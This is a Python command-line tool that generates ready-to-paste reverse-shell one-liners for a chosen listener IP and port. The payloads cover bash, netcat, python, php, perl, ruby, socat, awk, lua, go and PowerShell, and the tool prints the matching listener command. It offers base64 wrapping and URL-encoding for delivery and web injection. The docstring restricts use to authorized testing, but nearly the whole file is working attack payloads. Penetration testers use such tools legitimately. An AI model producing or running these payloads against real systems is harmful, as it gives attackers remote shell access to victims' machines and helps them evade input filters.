#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
revshell.py - Generate reverse-shell one-liners and the matching listener.

Prints ready-to-paste reverse shells for a chosen LHOST/LPORT across many
interpreters (bash, nc, python, php, perl, ruby, powershell, socat, awk...),
with optional URL-encoding or base64 wrapping for delivery, plus the listener
command to catch the connection. It only builds strings - it never connects.

For use on systems you are authorized to test (labs, CTFs, engagements with
written permission). Authorized / educational use only.

Examples:
    python3 revshell.py 10.10.14.5 4444
    python3 revshell.py 10.10.14.5 4444 -t bash --base64
    python3 revshell.py 10.10.14.5 4444 -t powershell --url-encode
    python3 revshell.py 10.10.14.5 4444 --list
    python3 revshell.py 10.10.14.5 4444 --listener socat
"""

import argparse
import base64
import sys
import urllib.parse

# name -> (platform, template). {ip}/{port} are substituted.
SHELLS = {
    "bash":       ("linux", "bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
    "bash-udp":   ("linux", "sh -i >& /dev/udp/{ip}/{port} 0>&1"),
    "sh":         ("linux", "sh -i >& /dev/tcp/{ip}/{port} 0>&1"),
    "nc":         ("linux", "nc {ip} {port} -e /bin/sh"),
    "nc-mkfifo":  ("linux", "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"),
    "ncat":       ("linux", "ncat {ip} {port} -e /bin/bash"),
    "python3":    ("linux", "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn(\"/bin/bash\")'"),
    "php":        ("linux", "php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    "perl":       ("linux", "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"),
    "ruby":       ("linux", "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
    "socat":      ("linux", "socat TCP:{ip}:{port} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"),
    "awk":        ("linux", "awk 'BEGIN{{s=\"/inet/tcp/0/{ip}/{port}\";while(1){{do{{printf \"shell>\" |& s;s |& getline c;if(c){{while((c |& getline) > 0)print $0 |& s;close(c)}}}}while(c!=\"exit\")close(s)}}}}' /dev/null"),
    "lua":        ("linux", "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""),
    "golang":     ("linux", "echo 'package main;import(\"os/exec\";\"net\");func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go"),
    "powershell": ("windows", "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sByte=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sByte,0,$sByte.Length);$s.Flush()}};$c.Close()\""),
    "powershell-b64": ("windows", "$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"),
}

LISTENERS = {
    "nc":    "nc -lvnp {port}",
    "ncat":  "ncat -lvnp {port}",
    "socat": "socat -d -d TCP-LISTEN:{port},reuseaddr,fork STDOUT",
    "socat-tty": "socat file:`tty`,raw,echo=0 TCP-LISTEN:{port}",
    "pwncat": "pwncat-cs -lp {port}",
}


def render(template, ip, port):
    return template.replace("{ip}", ip).replace("{port}", str(port))


def wrap_base64(payload):
    """Wrap a *nix payload so it survives copy/paste and odd quoting."""
    b64 = base64.b64encode(payload.encode()).decode()
    return f"echo {b64} | base64 -d | bash"


def main():
    p = argparse.ArgumentParser(
        description="Generate reverse-shell one-liners and the matching listener.",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("ip", nargs="?", help="LHOST - your listener IP")
    p.add_argument("port", nargs="?", type=int, help="LPORT - your listener port")
    p.add_argument("-t", "--type", help="only this shell (see --list for names)")
    p.add_argument("--list", action="store_true", help="list available shell types and exit")
    p.add_argument("--platform", choices=("linux", "windows"), help="filter by platform")
    p.add_argument("--base64", action="store_true", help="wrap *nix payloads in a base64 delivery string")
    p.add_argument("--url-encode", action="store_true", help="URL-encode the payload (web injection)")
    p.add_argument("--listener", nargs="?", const="nc", choices=list(LISTENERS),
                   help="also print a listener command (default nc)")
    args = p.parse_args()

    if args.list:
        for name, (plat, _) in SHELLS.items():
            print(f"  {name:<16} [{plat}]")
        return

    if not args.ip or not args.port:
        p.error("ip and port are required (or use --list)")
    if args.type and args.type not in SHELLS:
        p.error(f"unknown type '{args.type}'. Use --list to see the names.")

    selected = {args.type: SHELLS[args.type]} if args.type else SHELLS
    for name, (plat, tmpl) in selected.items():
        if args.platform and plat != args.platform:
            continue
        payload = render(tmpl, args.ip, args.port)
        if args.base64 and plat == "linux":
            payload = wrap_base64(payload)
        if args.url_encode:
            payload = urllib.parse.quote(payload)
        print(f"# {name} [{plat}]")
        print(payload + "\n")

    if args.listener:
        print(f"# listener\n{render(LISTENERS[args.listener], args.ip, args.port)}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
